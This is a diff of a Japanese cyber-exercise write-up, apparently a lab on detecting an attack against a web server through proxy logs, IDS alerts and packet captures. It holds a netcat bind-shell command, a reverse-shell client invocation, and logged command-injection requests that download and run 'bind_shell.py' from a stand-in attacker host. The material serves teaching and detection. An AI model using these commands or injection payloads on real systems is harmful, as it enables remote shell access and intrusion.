@@ -53,19 +53,19 @@ usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
 	  [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
 	  [-x proxy_address[:port]] [destination] [port]
 ```
-/// Target OSでport=4444をサービスデーモンとしListen  <br>
+* Target OSでport=4444をサービスデーモンとしListen  <br>
 ```
 vagrant@target:~$ sudo nc -lvp  4444 -e /bin/sh
 listening on [any] 4444 ...
 connect to [192.168.33.10] from attacker.cyexc-attacker [192.168.33.20] 33086
 ```
-/// Attacker OSでバックドア確認  <br>
+* Attacker OSでバックドア確認  <br>
 ```
 vagrant@attacker:~$ nc target.cyexc-target 4444
 pwd
 /home/vagrant
 ```
-/// WEBサーバにGETリクエストを送信  <br>
+* WEBサーバにGETリクエストを送信  <br>
 ```
 vagrant@attacker:~$ echo -en "GET / HTTP/1.1\n\n" | nc target.cyexc-target 80
 HTTP/1.1 400 Bad Request
@@ -109,15 +109,16 @@ Connection: close
 	8080/tcp open  http-proxy
 	MAC Address: 08:00:27:83:ED:1B (Cadmus Computer Systems)
 	```
-	iii. ncまたはtelnetを利用して、Attacker OSからTarget OSに接続し、Target OSのシェルを取得する。  <br>
-	Target OSからAttacker OSへの接続は`nodejs reverseShellClient.js -i 192.168.33.20`で行った。  <br>
-	以下はBind ShellでTarget OSのシェルを取得した際のTerminalのスクリーンショット。  <br>
+2. ncまたはtelnetを利用して、Attacker OSからTarget OSに接続し、Target OSのシェルを取得する。  <br>
+Target OSからAttacker OSへの接続は`nodejs reverseShellClient.js -i 192.168.33.20`で行った。  <br>
+以下はBind ShellでTarget OSのシェルを取得した際のTerminalのスクリーンショット。  <br>
 
-	<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/nc.png" title="ncスクリーンショット">
-	<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/telnet.png" title="telnetスクリーンショット">
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/nc.png" title="ncスクリーンショット">
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex2/images/telnet.png" title="telnetスクリーンショット">
 
 ### proxyサーバログの検知
 vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log<br>
+
 [20/Jan/2018:14:09:20 +0000] **"GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+700+bind_shell.py HTTP/1.1"** 200 842 "http://target.cyexc-target/getPage?host=8.8.8.8%3Bsudo+python+bind_shell.py" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
 
 URLエンコードすると、不正なOSコマンドを含むリクエストがわかる。
@@ -129,15 +130,17 @@ vagrant@target:~$ echo '/getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc
 
 ### IDSログの検知
 vagrant@www:~/apps$ cp /var/log/suricata/fast.log .<br>
-/// 不審なTCPを受信
-01/20/2018-15:23:29.690006  [**] [1:2010937:2] ET POLICY Suspicious inbound to mySQL port 3306 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:3306
-01/20/2018-15:23:29.761741  [**] [1:2010936:2] ET POLICY Suspicious inbound to Oracle SQL port 1521 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:1521
-/// ポートスキャンを受信
-01/20/2018-15:23:29.762176  [**] [1:2002911:6] ET SCAN Potential VNC Scan 5900-5920 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:5903
-01/20/2018-15:23:29.769568  [**] [1:2010939:2] ET POLICY Suspicious inbound to PostgreSQL port 5432 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:5432
+
+* 不審なTCPを受信  <br>
+01/20/2018-15:23:29.690006  [**] [1:2010937:2] ET POLICY Suspicious inbound to mySQL port 3306 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:3306  <br>
+01/20/2018-15:23:29.761741  [**] [1:2010936:2] ET POLICY Suspicious inbound to Oracle SQL port 1521 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:1521  <br>
+
+* ポートスキャンを受信  <br>
+01/20/2018-15:23:29.762176  [**] [1:2002911:6] ET SCAN Potential VNC Scan 5900-5920 [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:5903  <br>
+01/20/2018-15:23:29.769568  [**] [1:2010939:2] ET POLICY Suspicious inbound to PostgreSQL port 5432 [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} **192.168.33.20**:50426 -> **192.168.33.10**:5432  <br>
 <br>
 取得したログはこちら＠[fast.log](https://github.com/CyExc/CyExc/blob/master/2017/ex2/logs/fast.log)
-<br>
+
 ### proxyサーバでHTTP通信をキャプチャ
 実際にどのようなことが起きているのかは、WEBサーバのログで確認する。
 1. proxyサーバにログイン
@@ -162,10 +165,11 @@ CONTAINER ID        IMAGE                 COMMAND                  CREATED      
 vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .  
 ```
 
-/// リクエスト*/getPage?host=8.8.8.8;ls+-l*
++ 不審なリクエスト **ls　-l**    
 T 192.168.1.100:42012 -> 192.168.1.10:8080 [AP]  <br>
-GET **/getPage?host=8.8.8.8%3Bls+-l** HTTP/1.1  <br>
-/// Target OSに設置されたWEBサーバが上記リクエストのレスポンスに*ls -l*のコマンド結果を含めている。  <br>
+GET /getPage?host=8.8.8.8%3Bls+-l HTTP/1.1  <br>
+
++ Target OSに設置されたWEBサーバが上記リクエストのレスポンスに　**ls -l**　のコマンド結果が含まれている。  <br>
 T 192.168.1.10:8080 -> 192.168.1.100:42012 [A]  <br>
 HTTP/1.1 200 OK.  <br>
 ``
@@ -186,7 +190,7 @@ drwxr-xr-x 263 root  root  12288 Jan 20 13:23 node_modules
 -rw-r--r--   1 root  root  78310 Jan 20 13:23 package-lock.json
 -rw-r--r--   1
 ``
-  <br><br>
+
 取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/ex2/logs/ngrep.log)
 
 
